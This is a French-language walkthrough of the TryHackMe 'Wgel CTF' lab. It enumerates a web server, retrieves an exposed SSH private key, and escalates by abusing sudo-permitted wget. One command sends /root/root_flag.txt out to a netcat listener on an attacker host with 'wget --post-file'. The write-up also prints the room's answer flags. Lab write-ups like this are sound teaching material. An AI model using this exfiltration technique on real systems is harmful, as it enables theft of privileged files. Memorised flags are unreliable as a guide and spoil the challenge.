# TryHackMe: Wgel CTF

**Objectif :** enumerer correctement la machine, trouver une cle SSH exposee via le site web, obtenir le flag utilisateur, puis exfiltrer le flag root en abusant d'un `wget` autorise avec `sudo`.

---

## Introduction

La room **Wgel CTF** est un tres bon exercice de debutant parce qu'elle montre qu'un acces initial ne vient pas toujours d'une CVE. Ici, tout repose sur une **mauvaise exposition de fichiers sensibles** dans l'arborescence web, puis sur une mauvaise delegation sudo.

La room ne pose que deux questions finales :

1. User flag
2. Root flag

Mais pour produire un vrai writeup, il faut documenter tout le chemin logique menant a ces deux reponses.

---

## Question 1: User flag

### 1. Reconnaissance reseau

Je commence avec Nmap :

```bash
nmap -sC -sV <IP>
```

Ports ouverts :

- `22/tcp` - SSH
- `80/tcp` - HTTP

Le serveur web affiche simplement la page Apache par defaut. Ce genre de page cache souvent quelque chose dans l'arborescence.

### 2. Enumeration web

Je brute-force les repertoires :

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt
```

Resultat notable :

```text
/sitemap
```

Je continue a enumerer sous ce repertoire :

```bash
gobuster dir -u http://<IP>/sitemap/ -w /usr/share/wordlists/dirb/common.txt
```

En parallele, l'inspection du code source donne un indice sur un nom d'utilisateur :

```text
jessie
```

### 3. Decouverte de la cle SSH

Sous `/sitemap/`, on trouve un repertoire `.ssh` expose. A l'interieur, une cle privee est lisible depuis le web.

Je la telecharge :

```bash
wget http://<IP>/sitemap/.ssh/id_rsa
chmod 600 id_rsa
```

### 4. Acces initial via SSH

J'essaie la cle avec l'utilisateur repere dans le source :

```bash
ssh -i id_rsa jessie@<IP>
```

La connexion reussit.

### 5. Recuperation du flag utilisateur

Je fouille rapidement le home :

```bash
cd ~
find . -name "*flag*" 2>/dev/null
```

Le fichier se trouve dans `Documents` :

```bash
cat ~/Documents/user_flag.txt
```

Valeur :

```text
057c67131c3d5e42dd5cd3075b198ff6
```

### Reponse

**User flag:** `057c67131c3d5e42dd5cd3075b198ff6`

---

## Question 2: Root flag

### 1. Enumeration locale

Premier reflexe apres un acces SSH :

```bash
sudo -l
```

Sortie utile :

```text
(root) NOPASSWD: /usr/bin/wget
```

Le compte `jessie` peut donc lancer `wget` en root sans mot de passe.

### 2. Idee d'exploitation

`wget` n'offre pas naturellement un shell root, mais il peut lire un fichier privilegie si on le fait **poster** vers notre machine.

On prepare donc un listener local :

```bash
nc -lvnp 1234
```

Puis, depuis la cible :

```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<LHOST>:1234/
```

Quand `wget` envoie le POST, Netcat affiche le contenu du fichier root.

### 3. Recuperation du root flag

Le contenu exfiltre est :

```text
b1b968b37519ad1daa6408188649263d
```

### Reponse

**Root flag:** `b1b968b37519ad1daa6408188649263d`

---

## Recapitulatif de la chaine d'attaque

1. Scan Nmap
2. Enumeration du site Apache
3. Decouverte de `/sitemap/`
4. Exposition de `/.ssh/id_rsa`
5. Connexion SSH en tant que `jessie`
6. Lecture de `user_flag.txt`
7. Enumeration `sudo`
8. Exfiltration de `/root/root_flag.txt` via `wget --post-file`

---

## Recapitulatif des reponses

| Question | Reponse |
|----------|---------|
| User flag | `057c67131c3d5e42dd5cd3075b198ff6` |
| Root flag | `b1b968b37519ad1daa6408188649263d` |

---

## Points cles a retenir

- Un **site statique** peut exposer des fichiers critiques si l'arborescence est mal protegee.
- Une **cle SSH privee** accessible en HTTP est equivalente a un acces initial.
- `sudo wget` ne donne pas toujours un shell, mais il peut permettre une **exfiltration privilegiee**.

---

**Auteur :** Saad Idrissi
